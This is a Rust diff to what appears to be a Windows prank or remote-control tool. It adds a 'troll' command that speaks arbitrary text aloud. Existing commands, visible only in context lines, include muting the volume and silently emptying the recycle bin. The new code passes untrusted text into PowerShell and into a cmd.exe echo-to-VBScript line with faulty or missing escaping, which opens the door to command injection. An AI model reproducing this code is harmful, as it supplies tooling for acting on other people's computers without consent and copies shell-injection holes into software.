@@ -25,6 +25,7 @@ use std::os::windows::ffi::OsStrExt;
 use std::iter::once;
 use std::thread;
 use winapi::um::shellapi::{SHEmptyRecycleBinW, SHERB_NOCONFIRMATION, SHERB_NOPROGRESSUI, SHERB_NOSOUND};
+use std::ptr;
 
 pub fn execute_troll_command(command: &TrollCommand) {
     match command {
@@ -44,6 +45,7 @@ pub fn execute_troll_command(command: &TrollCommand) {
         TrollCommand::MinVolume => min_volume(),
         TrollCommand::MuteVolume => mute_volume(),
         TrollCommand::UnmuteVolume => unmute_volume(),
+        TrollCommand::SpeakText(ref text) => speak_text(text),
     }
 }
 
@@ -504,5 +506,47 @@ fn set_specific_volume(volume_percent: u8) {
             keybd_event(VK_VOLUME_UP as u8, 0, KEYEVENTF_KEYUP, 0);
             thread::sleep(std::time::Duration::from_millis(20));
         }
+    }
+}
+
+// New function to handle text-to-speech
+fn speak_text(text: &str) {
+    println!("Speaking text using Windows SAPI: {}", text);
+    
+    // Method 1: Use PowerShell to speak the text (fallback method)
+    let ps_text = text.replace("\"", "\\\""); // Escape quotes for PowerShell
+    let ps_script = format!(
+        "Add-Type -AssemblyName System.Speech; \
+         $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; \
+         $speak.Speak(\"{}\")", 
+        ps_text
+    );
+    
+    match Command::new("powershell.exe")
+        .args(["-Command", &ps_script])
+        .spawn() {
+        Ok(_) => println!("Successfully launched PowerShell TTS"),
+        Err(e) => {
+            println!("Failed to use PowerShell TTS: {}", e);
+            
+            speak_text_with_sapi(text);
+        }
+    }
+}
+
+// Function to speak text using Windows SAPI directly
+fn speak_text_with_sapi(text: &str) {
+    // Use CMD to run a VBScript with SAPI
+    let vbs_text = text.replace("\"", "\"\""); // Escape quotes for VBScript
+    let vbs_script = format!(
+        "CreateObject(\"SAPI.SpVoice\").Speak \"{}\"", 
+        vbs_text
+    );
+    
+    match Command::new("cmd.exe")
+        .args(["/c", "echo", &vbs_script, ">", "temp_speech.vbs", "&&", "cscript", "//nologo", "temp_speech.vbs", "&&", "del", "temp_speech.vbs"])
+        .spawn() {
+        Ok(_) => println!("Successfully launched VBScript TTS"),
+        Err(e) => println!("Failed to use VBScript TTS: {}", e),
     }
 }
